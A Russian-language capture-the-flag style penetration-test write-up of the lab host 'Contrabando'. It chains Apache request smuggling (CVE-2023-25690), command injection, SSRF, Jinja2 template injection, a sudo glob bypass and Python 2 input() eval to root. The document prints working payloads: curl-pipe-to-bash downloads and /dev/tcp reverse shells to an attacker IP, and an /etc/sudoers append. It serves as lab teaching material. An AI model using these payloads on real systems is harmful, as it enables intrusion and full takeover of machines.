# Отчёт о проникновении в инфраструктуру Contrabando

## Введение

В рамках задания проводилось тестирование на проникновение инфраструктуры компании Contrabando. По условию, компания была вынуждена вывести продукт из эксплуатации после недавней атаки и обратилась с просьбой провести расследование. Цель — воспроизвести цепочку атаки, получить доступ к системе, эскалировать привилегии до root.


## 1. Первичная разведка (Nmap)

**Команда:**

```bash
nmap -sC -sV -p- 10.130.190.139
```

**Результат:**

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 41:ed:cf:46:58:c8:5d:41:04:0a:32:a0:10:4a:83:3b (RSA)
|   256 e8:f9:24:5b:e4:b0:37:4f:00:9d:5c:d3:fb:54:65:0a (ECDSA)
|_  256 57:fd:4a:1b:12:ac:7c:90:80:88:b8:5a:5b:78:30:79 (ED25519)
80/tcp open  http    Apache httpd 2.4.55 ((Unix))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.55 (Unix)
| http-methods:
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_ Potentially risky methods: TRACE
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Вывод:** Apache 2.4.55, разрешён `TRACE`, PHP 7.4.33 (виден позже в заголовке).


## 2. Исследование порта 80

### 2.1. Главная страница

```
http://10.130.190.139/page/home.html
```

Текст: «Our password generator is currently down». Ссылка на бета-версию.

### 2.2. Фаззинг директорий и файлов

**Команда:**

```bash
gobuster dir -u http://10.130.190.139 -w /usr/share/wordlists/dirb/common.txt
```

Скрытых директорий не найдено.

### 2.3. Ошибка `readfile`

**Запрос:**

```bash
curl -v http://10.130.190.139/page/asd
```

**Ответ:**

```
Warning: readfile(asd): failed to open stream: No such file or directory in /var/www/html/index.php on line 5
```

**Заголовок:** `X-Powered-By: PHP/7.4.33`.

### 2.4. Страница генератора паролей

**Запрос:**

```bash
curl -v http://10.130.190.139/page/gen.php
```

**Ответ (исходный код):**

```php
<?php
function generateRandomPassword($length) {
    $password = exec("tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c " . $length);
    return $password;
}

if(isset($_POST['length'])){
    $length = $_POST['length'];
    $randomPassword = generateRandomPassword($length);
    echo $randomPassword;
}else{
    echo "Please insert the length parameter in the URL";
}
?>
```

**Вывод:** Command Injection в `length`. Страница возвращает **исходник**, не выполняя PHP.

### 2.5. Исходник `index.php`

**Запрос:**

```bash
curl -v http://10.130.190.139/page/index.php
```

**Ответ:**

```php
<?php 
$page = $_GET['page'];
if (isset($page)) {
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}
?>
```

**Вывод:** используется `readfile`, а не `include` — PHP Filter Chain RCE не сработает.

### 2.6. Vhosts

**Команда:**

```bash
ffuf -u http://contrabando.thm -H "Host: FUZZ.contrabando.thm" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

Vhosts не найдены.

### 2.7. Картинка

```
http://contrabando.thm/forestbridge.jpg
```

Скачана, проверена через `exiftool`, `strings`, `binwalk` — ничего полезного.


## 3. Эксплуатация CVE-2023-25690 (HTTP Request Smuggling)

### 3.1. Общий принцип

CVE-2023-25690 — CRLF-инъекция в Apache `mod_rewrite`/`mod_proxy` (версии 2.4.0–2.4.55). Позволяет «протащить» второй HTTP-запрос через прокси, минуя его фильтры. Прокси видит один запрос, а бэкенд — два.

### 3.2. Проверка уязвимости

**Команда:**

```bash
curl -v --path-as-is 'http://contrabando.thm/page/hello%20HTTP/1.1%0D%0AHost:%20localhost%0D%0A%0D%0APOST%20/gen.php%20HTTP/1.1%0D%0AHost:%20localhost%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0AContent-Length:%2049%0D%0A%0D%0Alength=5;curl%20http://192.168.132.43:4444/test.html'
```

**Разбор:**

- `%0D%0A` — CRLF (URL-кодирование).
- `%20` — пробел.
- `--path-as-is` — запрет нормализации пути.

**Результат:** обращение на `http://192.168.132.43:4444/test.html` зафиксировано.

### 3.3. Reverse shell через Smuggling

**Создан `rev.sh` на Kali:**

```bash
printf 'bash -i >& /dev/tcp/192.168.132.43/5555 0>&1\n' > rev.sh
```

**Запущен HTTP-сервер:**

```bash
python3 -m http.server 80
```

**Запущен слушатель:**

```bash
nc -lvnp 5555
```

**Smuggled-запрос:**

```bash
curl -v --path-as-is 'http://contrabando.thm/page/home.html%20HTTP/1.1%0D%0AHost:%20localhost%0D%0A%0D%0APOST%20/gen.php%20HTTP/1.1%0D%0AHost:%20localhost%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0AContent-Length:%2087%0D%0A%0D%0Alength=5;curl%20http://192.168.132.43/rev.sh%7Cbash;'
```

**`%7C` = `|`.** `|bash` сразу выполняет скачанный скрипт.

**Результат:** shell в контейнере `124a042cc76c`.


## 4. Разведка внутри контейнера

### 4.1. Проверка ограничений

**Команды:**

```bash
hostname
# 124a042cc76c

ls -la /proc/1/root/
# Permission denied

sudo -l
# sh: sudo: not found

find / -perm -4000 -type f 2>/dev/null
# /usr/bin/passwd, /usr/bin/chfn, /usr/bin/gpasswd, /usr/bin/chsh,
# /usr/bin/newgrp, /bin/mount, /bin/su, /bin/umount

find / -name docker.sock 2>/dev/null
# пусто

cat /etc/crontab
# No such file or directory

ls -la /etc/cron.d/
# только e2scrub_all

cat /etc/hosts
# 127.0.0.1 localhost
# 172.18.0.3 124a042cc76c

env
# APACHE_CONFDIR=/etc/apache2
# HOSTNAME=124a042cc76c
# PHP_VERSION=7.4.33
# PWD=/var/www/html
```

**Вывод:** `sudo` нет, SUID стандартные, `docker.sock` нет, cron нет.

### 4.2. Сеть контейнера

**Команда:**

```bash
cat /proc/net/arp
```

**Результат:**

```
IP address       HW type     Flags       HW address            Mask     Device
172.18.0.1       0x1         0x2         1e:59:61:dc:21:44     *        eth0
172.18.0.2       0x1         0x2         7e:88:59:d7:a8:c8     *        eth0
```

**Вывод:** `172.18.0.1` — шлюз (хост), `172.18.0.2` — соседний контейнер.

### 4.3. Сканирование портов хоста

**Команда:**

```bash
for port in 22 80 443 3000 5000 8000 8080 8443 9000 9090 3306 5432 6379 11211 27017; do
  echo "=== port $port ==="
  curl -s --connect-timeout 3 "http://172.18.0.1:$port"
done
```

**Результат:** на порту **5000** — Flask-приложение:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Website Display</title>
</head>
<body>
    <h1>Fetch Website Content</h1>
    <h2>Currently in Development</h2>
    <form method="POST">
        <label for="website_url">Enter Website URL:</label>
        <input type="text" name="website_url" id="website_url" required>
        <button type="submit">Fetch Website</button>
    </form>
    <div>
        
    </div>
</body>
```

### 4.4. Попытка Dirty Pipe (CVE-2022-0847)

**Команды:**

```bash
gcc --version
# gcc присутствует

uname -a
# Linux 124a042cc76c 5.15.0-139-generic

# Скачан и запущен эксплойт CVE-2022-0847-DirtyPipe
# Результат: без успеха (ядро пропатчено)
```


## 5. Атака на хост через порт 5000

### 5.1. SSRF

**Команда:**

```bash
curl -v 'http://172.18.0.1:5000/' --data 'website_url=file:///etc/passwd'
```

**Результат (фрагмент):**

```
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
hansolo:x:1000:1000::/home/hansolo:/bin/bash
```

**Вывод:** приложение уязвимо к SSRF, найден пользователь `hansolo`.

### 5.2. Проверка SSTI

**Команда:**

```bash
curl -v 'http://172.18.0.1:5000/' --data 'website_url={{7*7}}'
```

**Результат:**

```html
<div>
    49
</div>
```

**SSTI подтверждён.**

### 5.3. RCE через SSTI

**Создан `test.php`:**

```php
{{ config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/192.168.132.43/5555 0>&1"').read() }}
```

**Запущен слушатель:**

```bash
nc -lvnp 5555
```

**Запрос:**

```bash
curl -v 'http://172.18.0.1:5000/' --data 'website_url=192.168.132.43/test.php'
```

**Результат:** shell пользователя `hansolo`:

```bash
hansolo@contrabando:~$ id
uid=1000(hansolo) gid=1000(hansolo) groups=1000(hansolo)
```

**Общий принцип SSTI:** `os.popen()` выполняет команду напрямую, без shell. `bash -c "..."` заставляет bash интерпретировать строку целиком, включая `>&` и `/dev/tcp`.


## 6. Эскалация привилегий

### 6.1. `sudo -l`

**Команда:**

```bash
sudo -l
```

**Результат:**

```
Matching Defaults entries for hansolo on contrabando:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User hansolo may run the following commands on contrabando:
    (root) NOPASSWD: /usr/bin/bash /usr/bin/vault
    (root) /usr/bin/python* /opt/generator/app.py
```

### 6.2. Анализ `vault`

**Команда:**

```bash
cat /usr/bin/vault
```

**Результат:**

```bash
#!/bin/bash

check () {
    if [ ! -e "$file_to_check" ]; then
        /usr/bin/echo "File does not exist."
        exit 1
    fi
    compare
}

compare () {
    content=$(/usr/bin/cat "$file_to_check")
    read -s -p "Enter the required input: " user_input
    if [[ $content == $user_input ]]; then
        /usr/bin/echo ""
        /usr/bin/echo "Password matched!"
        /usr/bin/cat "$file_to_print"
    else
        /usr/bin/echo "Password does not match!"
    fi
}

file_to_check="/root/password"
file_to_print="/root/secrets"

check
```

**Уязвимость:** `[[ $content == $user_input ]]` без кавычек — GLOB-сопоставление. `*` матчит любую строку.

### 6.3. Эксплуатация GLOB

**Команда:**

```bash
sudo -u root /usr/bin/bash /usr/bin/vault
```

**Ввод:**

```
*
```

**Результат:**

```
Password matched!
1. Lightsaber Colors: ...
2. Darth Vader's Breathing: ...
3. Ewok Language: ...
4. Han Solo's Carbonite Freeze: ...
5. Yoda's Species and Name: ...
```

### 6.4. Брутфорс пароля `hansolo` скриптом *'brute.py'*

```
PASSWORD IS: EQu5ehwHcRfZ
```

### 6.5. Задача `@reboot`

**Команда:**

```bash
crontab -l
```

**Результат:**

```
@reboot /usr/bin/python3 /home/hansolo/app/app.py
```

**Проверка прав:**

```bash
ls -la /home/hansolo/app/app.py
# -rw-rw-r-- 1 hansolo hansolo 1278 Oct 17  2023 /home/hansolo/app/app.py
```

**Вывод:** файл доступен на запись `hansolo`, но ребутнуть машину без root нельзя. Вектор отложен.

### 6.6. RCE через Python 2 `input()`

**Проверка `app.py`:**

```bash
cat /opt/generator/app.py
```

**Результат:**

```python
import random
import string

def generate_password(length):
    characters = string.ascii_letters + string.digits + string.punctuation
    random.seed()
    secret = input("Any words you want to add to the password? ")
    password_characters = list(characters + secret)
    random.shuffle(password_characters)
    password = ''.join(password_characters[:length])
    return password

try:
    length = int(raw_input("Enter the desired length of the password: "))
except NameError:
    length = int(input("Enter the desired length of the password: "))
except ValueError:
    print("Invalid input. Using default length of 12.")
    length = 12

password = generate_password(length)
print("Generated Password:", password)
```

**Общий принцип:** в Python 2 `input()` = `eval(raw_input())` — выполняет введённую строку как Python-код.

**Запуск:**

```bash
sudo /usr/bin/python2 /opt/generator/app.py
```

**Ввод:**

```
Enter the desired length of the password: 12
Any words you want to add to the password? __import__("os").system("whoami")
```

**Результат:**

```
root
```

**Запись в `/etc/sudoers`:**

```
Any words you want to add to the password? __import__("os").system("echo 'hansolo ALL=(ALL:ALL) NOPASSWD: ALL' >> /etc/sudoers")
```

**Получение root:**

```bash
sudo -u root /bin/bash
```

**Результат:** root.


## Цепочка атаки

1. **Nmap** → 22 (SSH), 80 (Apache 2.4.55).
2. **Фаззинг** → `index.php` (readfile), `gen.php` (exec).
3. **CVE-2023-25690** (HTTP Request Smuggling) → выполнение `POST /gen.php` → reverse shell.
4. **Контейнер `124a042cc76c`** → сеть `172.18.0.0/16` → хост `172.18.0.1`.
5. **Порт 5000** → SSRF → `/etc/passwd` → `hansolo`.
6. **SSTI** → Jinja2 → RCE → shell `hansolo`.
7. **GLOB-инъекция в `vault`** → `/root/secrets` + брутфорс пароля `EQu5ehwHcRfZ`.
8. **Python 2 `input()`** → RCE от root → запись в `/etc/sudoers` → root.

## Рекомендации

1. Обновить Apache до 2.4.56+.
2. Параметризовать `exec()` в `gen.php`.
3. Ограничить SSRF (whitelist, блокировка `file://`).
4. Не использовать `render_template_string` с пользовательским вводом.
5. Экранировать переменные в bash: `[[ "$content" == "$user_input" ]]`.
6. Не использовать Python 2; в Python 3 `input()` безопасен.
7. Ограничить `sudo` — не давать `bash /usr/bin/vault`.


## Заключение

Задание пройдено полностью. Цепочка атаки: **HTTP Request Smuggling → RCE в контейнере → SSRF → SSTI → shell `hansolo` → GLOB-инъекция → брутфорс пароля → Python 2 `input()` → root**. Все команды, скрипты и payload'ы приведены выше. Цель достигнута — root-доступ получен.